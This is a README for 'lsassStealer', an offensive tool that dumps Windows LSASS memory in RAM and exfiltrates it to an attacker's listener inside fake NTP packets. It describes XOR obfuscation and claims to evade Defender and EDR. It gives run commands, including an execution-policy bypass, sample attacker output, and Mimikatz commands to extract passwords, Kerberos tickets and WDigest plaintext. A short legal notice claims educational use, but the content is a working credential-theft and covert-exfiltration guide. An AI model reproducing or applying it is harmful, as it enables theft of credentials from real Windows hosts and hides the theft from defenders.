
<h1 align="center"> Project lsassStealer </h1>

## **🔍 Overview**
`lsassStealer` is an tool designed to **dump the memory of the Windows process `lsass.exe`** and **exfiltrate** it using **UDP packets disguised as NTP requests**. Unlike traditional tools like **Mimikatz**, this tool performs all operations **in RAM**, avoiding detection by **Windows Defender, EDR, and forensic tools**.


The project consists of:
- A **dumper** (`memdump.c`) to **extract LSASS memory in RAM**.
- A **sender** that transmits the **compressed dump over UDP (NTP packets)**.
- A **receiver** (`server.py`) that **reassembles the fragments** and **decompresses the memory dump**.

---

## **🛠 Features**
### **🔹 Process Identification**
- The **process name (`lsass.exe`) is obfuscated** in the source code using **XOR encoding** (`0x13` key) to **bypass static detection**.
- **Windows APIs (`CreateToolhelp32Snapshot`)** are used to **enumerate processes and extract the PID** dynamically.

### **🔹 Memory Dumping**
- Uses **MiniDumpWriteDump (from `DbgHelp.dll`)** to dump LSASS **directly into RAM**, **never touching the disk**.
- A **memory-mapped file** acts as a temporary buffer to minimize detection.

### **🔹 Compression (zlib)**
- The **dump is compressed in-memory** using `zlib` before transmission.
- This **reduces size** and makes the exfiltration **less detectable**.

### **🔹 Exfiltration via Fake NTP Packets**
- The **compressed dump is fragmented into small chunks** and sent via **UDP packets disguised as NTP traffic**.
- The **"Transmit Timestamp" field** of the NTP packet is **hijacked** to store **payload fragments**.

### **🔹 Receiver Script**
- A **Python-based receiver** (`receiver.py`) **listens on UDP port 123 (NTP)**.
- It **reassembles the fragmented dump**, **decompresses** it, and **writes it to a file**.

---

## **📜 How NTP Packet Camouflage Works**
### **🔹 Normal NTP Packet Structure**
NTP (Network Time Protocol) packets typically contain **48 bytes**, with the last 8 bytes storing the **Transmit Timestamp**.

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|LI | VN  |Mode |    Stratum     |     Poll      |  Precision   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          Root Delay                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Root Dispersion                         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Reference Identifier                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                   Reference Timestamp (64 bits)               |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                   Originate Timestamp (64 bits)               |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                    Receive Timestamp (64 bits)                |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
|                    Transmit Timestamp (64 bits)               |    <------- Hijacked
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### **🔹 How This Tool Abuses NTP**
- Instead of sending a **valid NTP Transmit Timestamp**, we hijack this field and we **embed data** into it.
- The **first packet** contains a **header**:
  - **4 bytes** → `total number of fragments` (big-endian)
  - **4 bytes** → `total compressed size` (big-endian)
- Each **subsequent packet** contains:
  - **4 bytes** → `fragment sequence number`
  - **4 bytes** → `data fragment`

This **allows memory dump exfiltration under the guise of legitimate NTP traffic**.

---

## **🚀 Installation & Compilation**
### **🔹 Windows (PowerShell)**
 -- If you have VSCode or another configured environment
 1. Run the following command:
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force; ./run.ps1
   ```

---

## **🎯 Usage**
### **1️⃣ Run the Dumper (Attacker)**
On **Windows**:
```powershell
.\memdump.exe
```

You will be prompted to **enter the remote server IP and port** for exfiltration.

### **2️⃣ Run the Receiver (Listener)**
On the **attacker machine**, run:
```bash
python3 server.py
```
This will **listen on UDP port 123 (NTP)** and reconstruct the **exfiltrated dump**.

---

## **📌 Example Execution**
### **🟢 Attacker (Dumper)**
```
[*] Enter server IP: 192.168.1.100
[*] Enter server port: 123
[+] Process lsass.exe found with PID 1234
[+] Memory dump completed. Size: 16 MB.
[+] Compression completed. Compressed size: 512 KB.
[+] Header sent: 128 fragments, 512 KB total.
[+] Packet 1/128 sent.
...
[+] Transmission completed.
```

### **🟢 Receiver (Listener)**
```
[INFO] Listening on 0.0.0.0:123 (global timeout: 30s)
[INFO] Header received: 128 fragments, 512 KB compressed size.
[INFO] Receiving packets...
[Reconstitution] [========------] 50% (64/128)
[INFO] All fragments received.
[INFO] Decompressing...
[INFO] Dump saved as dump_memory.bin.
```
### WARNING : The exe has to be launched with SYSTEM privileges otherwise there's big chance it will fail.
---

## **🔍 Analyzing the Dump with Mimikatz**

Once you have obtained the memory dump file (`dump_memory.bin`), you can analyze it using **Mimikatz** to extract credentials and other sensitive information. Here are the steps and commands to do so:

1. **Download Mimikatz**: Ensure you have the latest version of Mimikatz from the official GitHub repository.

2. **Run Mimikatz**: Open a command prompt with administrative privileges and navigate to the directory containing Mimikatz.

3. **Load the Memory Dump**: Use the following commands to load and analyze the memory dump:

   ```shell
   mimikatz # sekurlsa::minidump dump_memory.bin
   mimikatz # sekurlsa::logonpasswords
   ```

   - The first command loads the memory dump file.
   - The second command extracts and displays logon passwords from the dump.

4. **Extract Additional Information**: You can use other Mimikatz commands to extract more information, such as:

   ```shell
   mimikatz # sekurlsa::tickets
   mimikatz # sekurlsa::wdigest
   ```

   - `sekurlsa::tickets`: Extracts Kerberos tickets.
   - `sekurlsa::wdigest`: Extracts plaintext credentials stored by WDigest.

---

## **⚠️ Legal Notice**
🚨 **This tool is for EDUCATIONAL and AUTHORIZED TESTING ONLY.**
Use this tool **only on systems you own or have explicit permission to test**.

---
